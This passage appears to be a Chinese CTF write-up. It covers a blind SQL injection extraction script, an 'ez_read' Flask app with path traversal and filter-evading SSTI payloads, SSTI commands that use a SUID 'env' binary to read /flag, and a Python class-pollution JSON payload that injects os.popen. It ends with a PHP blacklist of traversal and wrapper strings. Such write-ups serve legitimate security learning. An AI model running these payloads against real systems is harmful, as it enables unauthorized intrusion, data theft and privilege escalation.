</span></span></code></pre></div><p>查secret字段，字段里的值就是flag：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">secret</span>():
</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;http://019a6318-c732-7f8b-8582-ffeba4a20572.geek.ctfplus.cn/check.php&#34;</span>
</span></span><span style="display:flex;"><span>    secret <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">50</span>): 
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>whitespace <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;}{</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">~!@#$%^&amp;*()_+-=&#34;</span> <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_uppercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>ascii_lowercase <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits:
</span></span><span style="display:flex;"><span>            payload <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;admin&#39;/**/and/**/substr((select/**/group_concat(secret)/**/from/**/users),</span><span style="color:#e6db74">{</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">,1)=&#39;</span><span style="color:#e6db74">{</span>char<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;;&#34;</span>
</span></span><span style="display:flex;"><span>            params <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;name&#34;</span>: payload}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            resp <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(url<span style="color:#f92672">=</span>target, params<span style="color:#f92672">=</span>params)
</span></span><span style="display:flex;"><span>           
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;该用户存在且活跃&#34;</span> <span style="color:#f92672">in</span> resp<span style="color:#f92672">.</span>text:
</span></span><span style="display:flex;"><span>                secret <span style="color:#f92672">+=</span> char
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found: </span><span style="color:#e6db74">{</span>secret<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> secret
</span></span></code></pre></div><h2 id="ez_read">ez_read<a hidden class="anchor" aria-hidden="true" href="#ez_read">#</a></h2>
<p>读取故事页面存在任意文件读取，测试一下就知道有个<code>../</code>的替换，读取 <code>....//app.py</code>：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, render_template, render_template_string, redirect, url_for, session
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__, template_folder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;templates&#34;</span>, static_folder<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;static&#34;</span>)
</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;key_ciallo_secret&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>USERS <span style="color:#f92672">=</span> {}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">waf</span>(payload: str) <span style="color:#f92672">-&gt;</span> str:
</span></span><span style="display:flex;"><span>    print(len(payload))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> payload:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(payload) <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> (<span style="color:#ae81ff">114</span>, <span style="color:#ae81ff">514</span>):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> payload<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;(&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        waf <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;__class__&#34;</span>, <span style="color:#e6db74">&#34;__base__&#34;</span>, <span style="color:#e6db74">&#34;__subclasses__&#34;</span>, <span style="color:#e6db74">&#34;__globals__&#34;</span>, <span style="color:#e6db74">&#34;import&#34;</span>,<span style="color:#e6db74">&#34;self&#34;</span>,<span style="color:#e6db74">&#34;session&#34;</span>,<span style="color:#e6db74">&#34;blueprints&#34;</span>,<span style="color:#e6db74">&#34;get_debug_flag&#34;</span>,<span style="color:#e6db74">&#34;json&#34;</span>,<span style="color:#e6db74">&#34;get_template_attribute&#34;</span>,<span style="color:#e6db74">&#34;render_template&#34;</span>,<span style="color:#e6db74">&#34;render_template_string&#34;</span>,<span style="color:#e6db74">&#34;abort&#34;</span>,<span style="color:#e6db74">&#34;redirect&#34;</span>,<span style="color:#e6db74">&#34;make_response&#34;</span>,<span style="color:#e6db74">&#34;Response&#34;</span>,<span style="color:#e6db74">&#34;stream_with_context&#34;</span>,<span style="color:#e6db74">&#34;flash&#34;</span>,<span style="color:#e6db74">&#34;escape&#34;</span>,<span style="color:#e6db74">&#34;Markup&#34;</span>,<span style="color:#e6db74">&#34;MarkupSafe&#34;</span>,<span style="color:#e6db74">&#34;tojson&#34;</span>,<span style="color:#e6db74">&#34;datetime&#34;</span>,<span style="color:#e6db74">&#34;cycler&#34;</span>,<span style="color:#e6db74">&#34;joiner&#34;</span>,<span style="color:#e6db74">&#34;namespace&#34;</span>,<span style="color:#e6db74">&#34;lipsum&#34;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> w <span style="color:#f92672">in</span> waf:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> w <span style="color:#f92672">in</span> payload:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">raise</span> <span style="color:#a6e22e">ValueError</span>(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;waf&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> payload
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;index.html&#34;</span>, user<span style="color:#f92672">=</span>user)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/register&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> (request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> username <span style="color:#f92672">or</span> <span style="color:#f92672">not</span> password:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;用户名和密码不能为空&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> USERS:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;用户名已存在&#34;</span>)
</span></span><span style="display:flex;"><span>        USERS[username] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;password&#34;</span>: password}
</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#34;user&#34;</span>] <span style="color:#f92672">=</span> username
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;profile&#34;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> (request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;username&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span>strip()
</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        user <span style="color:#f92672">=</span> USERS<span style="color:#f92672">.</span>get(username)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user <span style="color:#f92672">or</span> user<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;password&#34;</span>) <span style="color:#f92672">!=</span> password:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>, error<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;用户名或密码错误&#34;</span>)
</span></span><span style="display:flex;"><span>        session[<span style="color:#e6db74">&#34;user&#34;</span>] <span style="color:#f92672">=</span> username
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;profile&#34;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>clear()
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;index&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/profile&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">profile</span>():
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
</span></span><span style="display:flex;"><span>    name_raw <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;name&#34;</span>, user)
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        filtered <span style="color:#f92672">=</span> waf(name_raw)
</span></span><span style="display:flex;"><span>        tmpl <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;欢迎，</span><span style="color:#e6db74">{</span>filtered<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        rendered_snippet <span style="color:#f92672">=</span> render_template_string(tmpl)
</span></span><span style="display:flex;"><span>        error_msg <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
</span></span><span style="display:flex;"><span>        rendered_snippet <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>        error_msg <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;渲染错误: </span><span style="color:#e6db74">{</span>e<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(
</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;profile.html&#34;</span>,
</span></span><span style="display:flex;"><span>        content<span style="color:#f92672">=</span>rendered_snippet,
</span></span><span style="display:flex;"><span>        name_input<span style="color:#f92672">=</span>name_raw,
</span></span><span style="display:flex;"><span>        user<span style="color:#f92672">=</span>user,
</span></span><span style="display:flex;"><span>        error_msg<span style="color:#f92672">=</span>error_msg,
</span></span><span style="display:flex;"><span>    )
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/read&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">read_file</span>():
</span></span><span style="display:flex;"><span>    user <span style="color:#f92672">=</span> session<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;user&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> user:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    base_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>dirname(__file__), <span style="color:#e6db74">&#34;story&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> sorted([f <span style="color:#66d9ef">for</span> f <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir(base_dir) <span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_dir, f))])
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
</span></span><span style="display:flex;"><span>        entries <span style="color:#f92672">=</span> []
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    filename <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;filename&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        filename <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>args<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;filename&#34;</span>) <span style="color:#f92672">or</span> <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    content <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>    error <span style="color:#f92672">=</span> <span style="color:#66d9ef">None</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> filename:
</span></span><span style="display:flex;"><span>        sanitized <span style="color:#f92672">=</span> filename<span style="color:#f92672">.</span>replace(<span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>        target_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(base_dir, sanitized)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(target_path):
</span></span><span style="display:flex;"><span>            error <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;文件不存在: </span><span style="color:#e6db74">{</span>sanitized<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(target_path, <span style="color:#e6db74">&#34;r&#34;</span>, encoding<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;utf-8&#34;</span>, errors<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;ignore&#34;</span>) <span style="color:#66d9ef">as</span> f:
</span></span><span style="display:flex;"><span>                content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;read.html&#34;</span>, files<span style="color:#f92672">=</span>entries, content<span style="color:#f92672">=</span>content, filename<span style="color:#f92672">=</span>filename, error<span style="color:#f92672">=</span>error, user<span style="color:#f92672">=</span>user)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>, port<span style="color:#f92672">=</span><span style="color:#ae81ff">8080</span>, debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><p><code>/profile</code> 路由下存在 ssti，构造114长度的payload，否则无法处理过滤括号</p>
<p>利用config缩短payload长度，flag需要root权限读取，查找suid权限文件：</p>
<pre tabindex="0"><code>{{config[&#39;__cl&#39;+&#39;ass__&#39;].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;find / -perm -u=s -type f 2&gt;/dev/null&#39;).read() }}

/usr/bin/su
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/umount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/mount
/usr/local/bin/env
</code></pre><p>查看env：</p>
<pre tabindex="0"><code>{{config[&#39;__cl&#39;+&#39;ass__&#39;].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;env&#39;).read()                                   }}

HINT=用我提个权吧
</code></pre><p>env后直接跟命令实现suid提权：</p>
<pre tabindex="0"><code>{{config[&#39;__cl&#39;+&#39;ass__&#39;].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;env cat /flag&#39;).read()                         }}
</code></pre><h2 id="百年继承">百年继承<a hidden class="anchor" aria-hidden="true" href="#百年继承">#</a></h2>
<p>正常流程：</p>
<pre tabindex="0"><code>上校已创建。
上校继承于他的父亲,他的父亲继承于人类
时间流逝：卷入武装起义：命运与战争交织。
时间流逝：抉择时刻：上校需要做出选择（武器与策略）。
事件：上校使用 spear，采取 ambush 策略。世界线变动...
(上校的weapon属性被赋值为spear,tactic属性被赋值为ambush)
时间流逝：宿命延续：行军与退却。
时间流逝：面对行刑队：命运的审判即将到来。
行刑队：开始执行判决。
行刑队也继承于人类
临死之前,上校目光瞄着行刑队的佩剑,上面分明写着：
lambda executor, target: (target.__del__(), setattr(target, &#39;alive&#39;, False), &#39;处决成功&#39;)
这是人类自古以来就拥有的execute_method属性...
处决成功
时间流逝：结局：命运如沙漏般倾泻……
</code></pre><p>上校继承于父亲，父亲继承于人类，自定义的 <code>weapon</code> 和 <code>tactic</code> 都是上校的属性，行刑队同样继承于人类，最后行刑执行的是人类的 <code>execute_method</code> 属性，页面回显是第三个操作结果</p>
<p>python 原型链污染，目标是将人类的 <code>execute_method</code> 第三个操作部分设置为命令执行结果</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;weapon&#34;</span>: <span style="color:#e6db74">&#34;spear&#34;</span>, 
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;tactic&#34;</span>: <span style="color:#e6db74">&#34;ambush&#34;</span>,
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;__class__&#34;</span>: {
</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&#34;__base__&#34;</span>: {
</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;__base__&#34;</span>: {
</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;execute_method&#34;</span>: <span style="color:#e6db74">&#34;lambda executor, target: (target.__del__(), setattr(target, &#39;alive&#39;, False), __import__(&#39;os&#39;).popen(&#39;env&#39;).read())&#34;</span>
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><h2 id="ez-seralize">ez-seralize<a hidden class="anchor" aria-hidden="true" href="#ez-seralize">#</a></h2>
<p>index.php：</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">ini_set</span>(<span style="color:#e6db74">&#39;display_errors&#39;</span>, <span style="color:#e6db74">&#39;0&#39;</span>);
</span></span><span style="display:flex;"><span>$filename <span style="color:#f92672">=</span> <span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;filename&#39;</span>]) <span style="color:#f92672">?</span> $_GET[<span style="color:#e6db74">&#39;filename&#39;</span>] <span style="color:#f92672">:</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$content <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>$error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($filename) <span style="color:#f92672">&amp;&amp;</span> $filename <span style="color:#f92672">!==</span> <span style="color:#e6db74">&#39;&#39;</span>) {
</span></span><span style="display:flex;"><span>    $balcklist <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#34;../&#34;</span>,<span style="color:#e6db74">&#34;%2e&#34;</span>,<span style="color:#e6db74">&#34;..&#34;</span>,<span style="color:#e6db74">&#34;data://&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;input&#34;</span>,<span style="color:#e6db74">&#34;%0a&#34;</span>,<span style="color:#e6db74">&#34;%&#34;</span>,<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74">&#34;%0d&#34;</span>,<span style="color:#e6db74">&#34;php://&#34;</span>,<span style="color:#e6db74">&#34;/etc/passwd&#34;</span>,<span style="color:#e6db74">&#34;/proc/self/environ&#34;</span>,<span style="color:#e6db74">&#34;php:file&#34;</span>,<span style="color:#e6db74">&#34;filter&#34;</span>];
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">foreach</span> ($balcklist <span style="color:#66d9ef">as</span> $v) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">strpos</span>($filename, $v) <span style="color:#f92672">!==</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>            $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;no no no&#34;</span>;
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($error <span style="color:#f92672">===</span> <span style="color:#66d9ef">null</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;serialized&#39;</span>])) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">require</span> <span style="color:#e6db74">&#39;function.php&#39;</span>;
</span></span><span style="display:flex;"><span>            $file_contents<span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file_contents <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to read seraizlie file or file does not exist: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $content <span style="color:#f92672">=</span> $file_contents;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>            $file_contents <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>($filename);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> ($file_contents <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) {
</span></span><span style="display:flex;"><span>                $error <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Failed to read file or file does not exist: &#34;</span> <span style="color:#f92672">.</span> <span style="color:#a6e22e">htmlspecialchars</span>($filename);
</span></span><span style="display:flex;"><span>            } <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>                $content <span style="color:#f92672">=</span> $file_contents;
</span></span><span style="display:flex;"><span>            }
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>} <span style="color:#66d9ef">else</span> {
</span></span><span style="display:flex;"><span>    $error <span style="color:#f92672">=</span> <span style="color:#66d9ef">null</span>;
</span></span><span style="display:flex;"><span>}
